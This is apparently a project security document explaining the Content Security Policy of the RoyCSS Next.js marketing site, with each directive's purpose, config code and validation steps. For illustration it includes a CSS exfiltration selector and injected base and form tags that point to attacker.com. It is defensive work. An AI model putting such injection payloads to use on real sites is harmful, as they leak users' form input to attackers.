# Content Security Policy — RoyCSS Marketing Site

- **Document owner:** Security Engineering & Supply Chain domain agent
- **Status:** Implemented — production policy in `src/proxy.ts`
  (static-safe), dev policy in `next.config.ts`
- **Last reviewed:** 2026-09-22
- **Related:** `src/proxy.ts` (the prod CSP — read its header comment
  before touching anything), `next.config.ts` (dev CSP + companion
  headers), `security/csp.ts` (emits the policy strings to
  `security/results/`), `security/CHECKLIST.md` §3 (release gate)

---

## 1. The shipped CSP header

### 1.1 Production (enforcing, static-safe)

Served by `src/proxy.ts` (Next.js 16 middleware) on every response:

```
default-src 'self';
script-src 'self' 'unsafe-inline';
style-src 'self' 'unsafe-inline';
img-src 'self' data: blob:;
font-src 'self' data:;
connect-src 'self';
media-src 'self' blob:;
frame-ancestors 'none';
base-uri 'self';
form-action 'self';
object-src 'none';
upgrade-insecure-requests;
```

**There are no per-request nonces and no `strict-dynamic` — by design,
permanently.** Postmortem [#54](https://github.com/Roy-Wanyoike/Roycss/issues/54):
a nonce-based policy (`script-src 'self' 'nonce-…' 'strict-dynamic'`) served
full prerendered HTML while the browser executed ZERO scripts — build-time
baked `<script>` tags can never carry a per-request nonce, and React 19
streaming emits unnonced inline scripts (`$RC` swaps, `__next_f` bootstrap).
The site was stuck on its loading fallback. Nonces cannot work on an app
with statically prerendered pages; do not reintroduce them. See the
block-comment at the top of `src/proxy.ts` for the full failure analysis.

### 1.2 Development (relaxed for Next.js HMR)

```
default-src 'self';
script-src 'self' 'unsafe-inline' 'unsafe-eval';
style-src 'self' 'unsafe-inline';
img-src 'self' data: blob:;
font-src 'self' data:;
connect-src 'self' ws: wss:;
media-src 'self' blob:;
frame-ancestors 'none';
base-uri 'self';
form-action 'self';
object-src 'none';
upgrade-insecure-requests;
```

---

## 2. Why each directive is needed

### `default-src 'self'`

**Why:** Fallback for any directive not explicitly listed. Everything not
explicitly allowed is denied. Without this, browsers fall back to
`default-src 'none'` semantics for unlisted directives, which would break
the site (no images, no styles, no fonts).

**RoyCSS-specific:** All RoyCSS resources are same-origin (`/_next/static/`,
`/images/`, etc.). No third-party origins need to be in `default-src`.

---

### `script-src 'self' 'unsafe-inline'` (prod and dev; dev adds `'unsafe-eval'`)

**Why:** Controls which scripts can execute. This is the single most
important CSP directive for XSS prevention.

- `'self'` — allows same-origin scripts (Next.js bundles).
- `'unsafe-inline'` — **the accepted, documented tradeoff** (see
  `src/proxy.ts` header + postmortem #54). Next.js App Router apps that
  serve statically prerendered pages ship framework-generated inline
  scripts (React streaming `$RC` swaps, the `__next_f` flight-data
  bootstrap) that CANNOT be nonced or hashed by application code. A
  stricter `script-src` silently breaks hydration on every prerendered
  route — the exact #54 outage. The compensating controls stay tight:
  `object-src 'none'`, `base-uri 'self'`, `frame-ancestors 'none'`,
  `form-action 'self'`, and — most importantly — `connect-src 'self'`,
  so even injected inline script cannot phone home to a third party.
  Revisit ONLY with a hash-based policy for the known inline scripts;
  per-request nonces are permanently off the table for this app.
- `'unsafe-eval'` (dev only) — some dev tooling (source maps, eval-based
  HMR) requires eval. Not needed in prod.

**RoyCSS-specific:** RoyCSS ships **zero** inline scripts in its library
CSS. The marketing site's inline scripts are all framework-generated.

---

### `style-src 'self' 'unsafe-inline'`

**Why:** Controls which stylesheets can apply.

- `'self'` — allows same-origin stylesheets (Next.js CSS bundles,
  `dist/roycss.min.css`).
- `'unsafe-inline'` — required because:
  - Next.js injects inline styles for SSR hydration
  - Tailwind 4 generates inline styles for some utilities
  - framer-motion injects inline styles for animations
  - Radix UI injects inline styles for positioning
  - RoyCSS's `DynamicEffectCSS` injects `<style dangerouslySetInnerHTML>`
    with library CSS (the 3 `// SECURITY:`-annotated sites)

**Why not nonce styles?** Next.js does not support per-request nonces
for `<style>` tags (only for `<script>` tags). Noncing every style
injection would require patching Next.js internals.

**Residual risk:** `'unsafe-inline'` for `style-src` does **not** enable
script execution. The residual risk is CSS-based exfiltration (e.g.
`input[value^="a"] { background: url(attacker.com/?a) }`). This is
defeated by `security/css-exfiltration-check.ts`, which scans every
RoyCSS effect for external `url()`, `@import`, `@font-face` external
`src`, and attribute-selector + `url()` combos.

---

### `img-src 'self' data: blob:`

**Why:** Controls which images can load.

- `'self'` — same-origin images (`/images/`, `/_next/static/`).
- `data:` — inline data URIs (some RoyCSS effects use
  `background: url(data:image/svg+xml,...)` for inline SVG patterns).
- `blob:` — blob URLs (some Radix components use blob URLs for image
  previews).

**No external image hosts.** All RoyCSS marketing site images are local.

---

### `font-src 'self' data:`

**Why:** Controls which fonts can load.

- `'self'` — `next/font/google` self-hosts fonts at `/_next/static/media/`.
  The font files are downloaded at build time and served from the same
  origin. No external font CDN.
- `data:` — some RoyCSS effects embed fonts as data URIs (rare; most
  effects don't use fonts).

---

### `connect-src 'self'` (prod)
### `connect-src 'self' ws: wss:` (dev)

**Why:** Controls `fetch()`, `XMLHttpRequest`, WebSocket, EventSource,
Navigator.sendBeacon. This is the directive that prevents exfiltration
of data to attacker origins.

- `'self'` — same-origin API calls (e.g. `POST /api/contact`).
- `ws:` / `wss:` (dev only) — Next.js HMR uses WebSocket to push code
  updates. Not needed in prod.

**No analytics, no third-party APIs, no telemetry.** The site makes zero
cross-origin `fetch()` calls.

---

### `media-src 'self' blob:`

**Why:** Controls `<audio>` and `<video>` sources.

- `'self'` — same-origin media files.
- `blob:` — blob URLs for dynamically generated media (e.g. recorded
  audio).

**RoyCSS-specific:** The site has no media. This directive is defense-in-
depth.

---

### `frame-ancestors 'none'`

**Why:** Prevents the site from being embedded in an `<iframe>`,
`<object>`, or `<embed>`. Strictly stronger than `X-Frame-Options: DENY`.

**RoyCSS-specific:** The marketing site has no legitimate embed use case.
Clickjacking is fully mitigated.

---

### `base-uri 'self'`

**Why:** Restricts the `<base>` element. Without this, an attacker who
can inject `<base href="https://attacker.com/">` could redirect all
relative URLs (including form actions and script sources) to the
attacker's origin.

**RoyCSS-specific:** The site never uses `<base>`, but locking it down
is defense-in-depth.

---

### `form-action 'self'`

**Why:** Restricts where forms can submit to. Without this, an attacker
who can inject a `form[action="https://attacker.com/"]` could exfiltrate
form data to the attacker's origin on submit.

**RoyCSS-specific:** The contact form submits to `/api/contact` (same
origin). The search overlay uses client-side filtering (no form submit).
No form on the site submits to a cross-origin.

---

### `object-src 'none'`

**Why:** Blocks Flash, Java, PDF, and other plugins via `<object>`,
`<embed>`, `<applet>`. These are legacy attack surfaces.

**RoyCSS-specific:** The site uses none of these. Defense-in-depth.

---

### `upgrade-insecure-requests`

**Why:** Forces the browser to upgrade every HTTP subresource request to
HTTPS. If an attacker injects `<img src="http://attacker.com/track.png">`,
the browser rewrites it to `https://attacker.com/track.png` — which
fails (assuming attacker.com has no valid cert) or at least doesn't send
over plaintext.

**RoyCSS-specific:** The site is HTTPS-only (HSTS preload). This directive
is belt-and-suspenders.

---

## 3. How to implement in `next.config.ts`

The CSP is set via the `headers()` function in `next.config.ts`. The
current implementation (as of 2026-07-30):

```typescript
import type { NextConfig } from "next";

const DEV_CSP = [
  "default-src 'self'",
  "script-src 'self' 'unsafe-inline' 'unsafe-eval'",
  "style-src 'self' 'unsafe-inline'",
  "img-src 'self' data: blob:",
  "font-src 'self' data:",
  "connect-src 'self' ws: wss:",
  "media-src 'self' blob:",
  "frame-ancestors 'none'",
  "base-uri 'self'",
  "form-action 'self'",
  "object-src 'none'",
  "upgrade-insecure-requests",
].join("; ") + ";";

const securityHeaders = [
  { key: "Content-Security-Policy", value: DEV_CSP },
  { key: "X-Frame-Options", value: "DENY" },
  { key: "X-Content-Type-Options", value: "nosniff" },
  { key: "Referrer-Policy", value: "strict-origin-when-cross-origin" },
  { key: "Permissions-Policy", value: "camera=(), microphone=(), geolocation=()" },
  { key: "X-DNS-Prefetch-Control", value: "on" },
  { key: "Strict-Transport-Security", value: "max-age=63072000; includeSubDomains; preload" },
  { key: "Cross-Origin-Opener-Policy", value: "same-origin" },        // added by security audit 2026-07-30
  { key: "Cross-Origin-Resource-Policy", value: "same-origin" },      // added by security audit 2026-07-30
];

const nextConfig: NextConfig = {
  output: "standalone",
  typescript: { ignoreBuildErrors: true },
  reactStrictMode: false,
  async headers() {
    return [
      { source: "/:path*", headers: securityHeaders },
    ];
  },
};

export default nextConfig;
```

### 3.1 Production override via `src/proxy.ts`

The dev CSP above is **overridden** in production by `src/proxy.ts`
(renamed from `src/middleware.ts` in Next.js 16), which sets the
static-safe policy from §1.1 on every matched response — including
prerendered pages served from the static cache:

```typescript
// src/proxy.ts (excerpt — the real file carries a long postmortem comment)

function buildProductionCsp(): string {
  return (
    [
      "default-src 'self'",
      // 'unsafe-inline' is required for React streaming ($RC swaps) and the
      // __next_f bootstrap scripts on prerendered pages — see header comment.
      "script-src 'self' 'unsafe-inline'",
      // … the rest of §1.1 …
    ].join("; ") + ";"
  );
}

export function proxy(request: NextRequest): NextResponse {
  if (process.env.NODE_ENV !== "production") {
    return NextResponse.next();   // dev: the next.config.ts CSP applies
  }
  const response = NextResponse.next();
  response.headers.set("Content-Security-Policy", buildProductionCsp());
  return response;
}
```

The proxy runs on every route except static assets (see the `matcher`
config at the bottom of `src/proxy.ts`). Because the policy is a plain
host-source allowlist, it is byte-identical for dynamically rendered AND
build-time prerendered responses — the browser validates the same HTML
either way.

---

## 4. Report-only vs enforce mode

**Recommendation: enforce from day one.** (Already implemented.)

### Why enforce, not report-only

| Factor | Report-only | Enforce |
|---|---|---|
| Day-one protection | ❌ No — violations are logged, not blocked | ✅ Yes |
| Risk of breaking the site | Low (can iterate) | Medium (need to test first) |
| Operational overhead | High (need a reporting endpoint, rate-limit it) | Low |
| Suitability for RoyCSS | ❌ The site is small, one route, no third-party scripts — we can validate locally before shipping | ✅ The strict CSP is validated with the agent-browser harness before every release |

### When to reconsider

If we add a third-party script (analytics, error reporting, A/B testing),
we should:

1. Add a `Content-Security-Policy-Report-Only` header with the proposed
   new CSP (including the third-party origin) for 1 week.
2. Collect violations via a `report-to` endpoint.
3. If no real-user violations, switch to enforcing.
4. If violations, adjust the CSP and repeat.

### Reporting endpoint (not currently configured)

If a `report-to` directive is added later, the endpoint must:

- Rate-limit (e.g. 1 report per 60 seconds per browser) to prevent
  report floods.
- Be on the same origin (or a dedicated subdomain with CORS configured).
- Not log the full violation report (it can contain page content).

---

## 5. Validation

### 5.1 Local validation

```bash
# Verify the dev CSP is set
curl -I http://localhost:3000/ | grep -i content-security-policy

# Verify the prod CSP is set (after `bun run build && bun run start`)
curl -I http://localhost:3000/ | grep -i content-security-policy
# Should contain: script-src 'self' 'unsafe-inline' — and NO nonce-/strict-dynamic
```

### 5.2 CSP Evaluator

Paste the prod CSP into
[Google's CSP Evaluator](https://csp-evaluator.withgoogle.com/). The
`'unsafe-inline'` finding for `script-src` is the documented, accepted
tradeoff (§2 and `src/proxy.ts`) — everything else passes clean.

### 5.3 Agent-browser smoke test

The release pipeline runs an agent-browser smoke test that:

1. Loads `https://roycss.com/`
2. Verifies the `Content-Security-Policy` header is present
3. Verifies the CSP matches the static-safe policy (`script-src 'self'
   'unsafe-inline'`, `frame-ancestors 'none'`) and contains **no**
   `nonce-` / `strict-dynamic`
4. Verifies no CSP violations appear in the browser console
5. Verifies the contact form submits successfully (CSP doesn't block
   `/api/contact`)

---

## 6. Adding a new directive

To add a new CSP directive (e.g. `worker-src 'self'`):

1. Add the directive to **both** the dev CSP in `next.config.ts` and the
   prod CSP in `src/proxy.ts`. (Divergence is a known risk; keep
   them in sync.)
2. Update `security/csp.ts` to emit the new directive to
   `security/results/csp.txt` and `csp-production.txt`.
3. Update this document (`security/CSP.md`) §1 and §2, and the §3 rows of
   `security/CHECKLIST.md`.
4. Run the agent-browser smoke test to verify no violations.
5. Run `bun run lint` to verify the config still parses.

---

## 7. Adding a new third-party origin

If a third-party script (e.g. analytics) is added:

1. **Do not** loosen `script-src` beyond adding the specific origin:
   `script-src 'self' 'unsafe-inline' https://analytics.example.com`
   (and remember postmortem #54: never trade `'unsafe-inline'` away for
   nonces — they break prerendered pages).
2. Add the origin to `connect-src` if it makes `fetch()` calls:
   `connect-src 'self' https://analytics.example.com`.
3. Add the origin to `img-src` if it loads pixels:
   `img-src 'self' data: blob: https://analytics.example.com`.
4. Add a `Report-Only` period (see §4) to verify no real-user breakage.
5. Update this document and `security/CHECKLIST.md` §3.
6. Re-evaluate the threat model — a third-party script expands the
   supply chain.

---

## 8. References

- `src/proxy.ts` — the prod CSP as served + the #54 postmortem comment
  (read before touching the CSP)
- `security/results/csp.txt` — dev CSP string (regenerated by
  `security/csp.ts`; outputs are gitignored)
- `security/results/csp-production.txt` — production CSP string
  (regenerated by `security/csp.ts`; gitignored)
- `next.config.ts` — dev CSP + companion security headers
- `security/CHECKLIST.md` §3 — the release gate for these headers
- Postmortem: [#54](https://github.com/Roy-Wanyoike/Roycss/issues/54)
  (P0 outage — nonce/`strict-dynamic` on statically prerendered pages)
- Next.js CSP guide: <https://nextjs.org/docs/app/guides/content-security-policy>
  (its nonce guidance assumes fully dynamic rendering — not our case)
- Google CSP Evaluator: <https://csp-evaluator.withgoogle.com/>
- MDN CSP reference: <https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP>
- OWASP CSP Cheat Sheet: <https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html>
